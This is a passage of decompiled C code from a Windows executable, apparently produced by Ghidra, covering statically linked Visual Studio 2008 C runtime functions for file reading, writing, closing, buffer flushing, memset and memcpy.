      if (local_10 != (short *)_DstBuf) {
        _free(local_10);
      }
      if (local_18 == -2) {
        return (int)local_14;
      }
      return local_18;
    }
  }
LAB_004151fc:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_0041520e:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2008 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0042d77c)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_004157b9();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_00415715;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_00415715:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



void FUN_004157b9(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0xff < _Size)) && (DAT_0042d778 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Val,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_0042d780 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_0042d780 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_004158b0;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_004158b2;
    }
  }
LAB_004158b0:
  DVar4 = 0;
LAB_004158b2:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2008 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0042d77c)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_004159a9();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_004159a9(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_00415a0a:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_00415a0a;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_00414378(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_00414378(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_0042a648;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_0042d780)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_00415b32;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_00415b32:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  WCHAR WVar1;
  wint_t wVar2;
  ulong *puVar3;
  int *piVar4;
  int iVar5;
  _ptiddata p_Var6;
  BOOL BVar7;
  DWORD nNumberOfBytesToWrite;
  int iVar8;
  uint uVar9;
  char cVar10;
  WCHAR *pWVar11;
  char *pcVar12;
  int unaff_EDI;
  WCHAR *pWVar13;
  ushort uVar14;
  UINT local_1ae8;
  uint local_1ae4;
  char local_1add;
  int *local_1adc;
  char *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  char *local_1acc;
  WCHAR *local_1ac8;
  DWORD local_1ac4;
  WCHAR *local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined2 local_10;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = (char *)0x0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_0041626e;
  if (_Buf == (void *)0x0) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0041626e;
  }
  piVar4 = &DAT_0042d780 + (_FileHandle >> 5);
  iVar8 = (_FileHandle & 0x1fU) * 0x40;
  cVar10 = (char)(*(char *)(*piVar4 + iVar8 + 0x24) * '\x02') >> 1;
  local_1add = cVar10;
  local_1adc = piVar4;
  if (((cVar10 == '\x02') || (cVar10 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0041626e;
  }
  if ((*(byte *)(*piVar4 + iVar8 + 4) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  }
  iVar5 = __isatty(_FileHandle);
  if ((iVar5 == 0) || ((*(byte *)(iVar8 + 4 + *piVar4) & 0x80) == 0)) {
LAB_00415edf:
    if ((*(byte *)((HANDLE *)(*piVar4 + iVar8) + 1) & 0x80) == 0) {
      BVar7 = WriteFile(*(HANDLE *)(*piVar4 + iVar8),local_1ad0,_MaxCharCount,(LPDWORD)&local_1ad8,
                        (LPOVERLAPPED)0x0);
      if (BVar7 == 0) {
LAB_004161df:
        local_1ac4 = GetLastError();
      }
      else {
        local_1ac4 = 0;
        local_1acc = local_1ad8;
      }
LAB_004161eb:
      if (local_1acc != (char *)0x0) goto LAB_0041626e;
      goto LAB_004161f4;
    }
    local_1ac4 = 0;
    if (cVar10 == '\0') {
      local_1ac8 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_00416230;
      do {
        local_1ac0 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac8 - (int)local_1ad0;
        pWVar11 = local_1abc;
        do {
          if (_MaxCharCount <= uVar9) break;
          pWVar13 = (WCHAR *)((int)local_1ac8 + 1);
          cVar10 = *(char *)local_1ac8;
          uVar9 = uVar9 + 1;
          if (cVar10 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar11 = '\r';
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          *(char *)pWVar11 = cVar10;
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          local_1ac8 = pWVar13;
        } while (local_1ac0 < (WCHAR *)0x13ff);
        BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                          (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
        if (BVar7 == 0) goto LAB_004161df;
        local_1acc = local_1acc + (int)local_1ad8;
      } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
              (piVar4 = local_1adc, (uint)((int)local_1ac8 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_004161eb;
    }
    local_1ac0 = local_1ad0;
    if (cVar10 == '\x02') {
      if (_MaxCharCount != 0) {
        do {
          local_1ac8 = (WCHAR *)0x0;
          uVar9 = (int)local_1ac0 - (int)local_1ad0;
          pWVar11 = local_1abc;
          do {
            if (_MaxCharCount <= uVar9) break;
            pWVar13 = local_1ac0 + 1;
            WVar1 = *local_1ac0;
            uVar9 = uVar9 + 2;
            if (WVar1 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar11 = L'\r';
              pWVar11 = pWVar11 + 1;
              local_1ac8 = local_1ac8 + 1;
            }
            local_1ac8 = local_1ac8 + 1;
            *pWVar11 = WVar1;
            pWVar11 = pWVar11 + 1;
            local_1ac0 = pWVar13;
          } while (local_1ac8 < (WCHAR *)0x13fe);
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_004161df;
          local_1acc = local_1acc + (int)local_1ad8;
        } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
                (piVar4 = local_1adc, (uint)((int)local_1ac0 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_004161eb;
      }
    }
    else if (_MaxCharCount != 0) {
      do {
        local_1ac8 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac0 - (int)local_1ad0;
        pWVar11 = local_6bc;
        do {
          if (_MaxCharCount <= uVar9) break;
          WVar1 = *local_1ac0;
          local_1ac0 = local_1ac0 + 1;
          uVar9 = uVar9 + 2;
          if (WVar1 == L'\n') {
            *pWVar11 = L'\r';
            pWVar11 = pWVar11 + 1;
            local_1ac8 = local_1ac8 + 1;
          }
          local_1ac8 = local_1ac8 + 1;
          *pWVar11 = WVar1;
          pWVar11 = pWVar11 + 1;
        } while (local_1ac8 < (WCHAR *)0x6a8);
        pcVar12 = (char *)0x0;
        iVar5 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar11 - (int)local_6bc) / 2,
                                    local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar5 == 0) goto LAB_004161df;
        do {
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),local_1414 + (int)pcVar12,
                            iVar5 - (int)pcVar12,(LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) {
            local_1ac4 = GetLastError();
            break;
          }
          pcVar12 = pcVar12 + (int)local_1ad8;
        } while ((int)pcVar12 < iVar5);
      } while ((iVar5 <= (int)pcVar12) &&
              (local_1acc = (char *)((int)local_1ac0 - (int)local_1ad0), local_1acc < _MaxCharCount)
              );
      goto LAB_004161eb;
    }
  }
  else {
    p_Var6 = __getptd();
    local_1ae4 = (uint)(p_Var6->ptlocinfo->lc_category[0].wlocale == (wchar_t *)0x0);
    BVar7 = GetConsoleMode(*(HANDLE *)(iVar8 + *piVar4),&local_1ae8);
    if ((BVar7 == 0) || ((local_1ae4 != 0 && (cVar10 == '\0')))) goto LAB_00415edf;
    local_1ae8 = GetConsoleCP();
    local_1ac8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac0 = (WCHAR *)0x0;
      pWVar11 = local_1ad0;
      do {
        piVar4 = local_1adc;
        if (local_1add == '\0') {
          cVar10 = *(char *)pWVar11;
          local_1ae4 = (uint)(cVar10 == '\n');
          iVar5 = *local_1adc + iVar8;
          if (*(int *)(iVar5 + 0x38) == 0) {
            iVar5 = _isleadbyte(CONCAT22(cVar10 >> 7,(short)cVar10));
            if (iVar5 == 0) {
              uVar14 = 1;
              pWVar13 = pWVar11;
              goto LAB_00415d46;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar11)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(undefined *)(iVar8 + 0x34 + *piVar4) = *(undefined *)pWVar11;
              *(undefined4 *)(iVar8 + 0x38 + *piVar4) = 1;
              break;
            }
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar11,2);
            if (iVar5 == -1) break;
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          else {
            local_10._0_1_ = *(CHAR *)(iVar5 + 0x34);
            *(undefined4 *)(iVar5 + 0x38) = 0;
            uVar14 = 2;
            pWVar13 = &local_10;
            local_10._1_1_ = cVar10;
LAB_00415d46:
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar13,(uint)uVar14);
            if (iVar5 == -1) break;
          }
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          nNumberOfBytesToWrite =
               WideCharToMultiByte(local_1ae8,0,(LPCWSTR)&local_1ac4,1,(LPSTR)&local_10,5,
                                   (LPCSTR)0x0,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ac8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_004161df;
          local_1acc = (char *)((int)local_1ac0 + local_1ad4);
          if ((int)local_1ac8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae4 != 0) {
            local_10._0_1_ = '\r';
            BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),&local_10,1,(LPDWORD)&local_1ac8,
                              (LPOVERLAPPED)0x0);
            if (BVar7 == 0) goto LAB_004161df;
            if ((int)local_1ac8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            local_1ac4 = (DWORD)(ushort)*pWVar11;
            local_1ae4 = (uint)(*pWVar11 == L'\n');
            pWVar11 = pWVar11 + 1;
            local_1ac0 = local_1ac0 + 1;
          }
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            wVar2 = __putwch_nolock((wchar_t)local_1ac4);
            if (wVar2 != (wint_t)local_1ac4) goto LAB_004161df;
            local_1acc = local_1acc + 2;
            if (local_1ae4 != 0) {
              local_1ac4 = 0xd;
              wVar2 = __putwch_nolock(L'\r');
              if (wVar2 != (wint_t)local_1ac4) goto LAB_004161df;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac0 < _MaxCharCount);
      goto LAB_004161eb;
    }
LAB_004161f4:
    piVar4 = local_1adc;
    if (local_1ac4 != 0) {
      if (local_1ac4 == 5) {
        piVar4 = __errno();
        *piVar4 = 9;
        puVar3 = ___doserrno();
        *puVar3 = 5;
      }
      else {
        __dosmaperr(local_1ac4);
      }
      goto LAB_0041626e;
    }
  }
LAB_00416230:
  if (((*(byte *)(iVar8 + 4 + *piVar4) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    piVar4 = __errno();
    *piVar4 = 0x1c;
    puVar3 = ___doserrno();
    *puVar3 = 0;
  }
LAB_0041626e:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2008 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0042d77c)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_0042d780)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_0041634d();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0041634d(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_00416543_caseD_2;
        case 3:
          goto switchD_00416543_caseD_3;
        }
        goto switchD_00416543_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_00416543_caseD_0;
      case 1:
        goto switchD_00416543_caseD_1;
      case 2:
        goto switchD_00416543_caseD_2;
      case 3:
        goto switchD_00416543_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00416543_caseD_2;
            case 3:
              goto switchD_00416543_caseD_3;
            }
            goto switchD_00416543_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00416543_caseD_2;
            case 3:
              goto switchD_00416543_caseD_3;
            }
            goto switchD_00416543_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00416543_caseD_2;
            case 3:
              goto switchD_00416543_caseD_3;
            }
            goto switchD_00416543_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_00416543_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_00416543_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_00416543_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_00416543_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_0042d778 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_004163bc_caseD_2;
      case 3:
        goto switchD_004163bc_caseD_3;
      }
      goto switchD_004163bc_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_004163bc_caseD_0;
    case 1:
      goto switchD_004163bc_caseD_1;
    case 2:
      goto switchD_004163bc_caseD_2;
    case 3:
      goto switchD_004163bc_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004163bc_caseD_2;
          case 3:
            goto switchD_004163bc_caseD_3;
          }
          goto switchD_004163bc_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_004163bc_caseD_2;
          case 3:
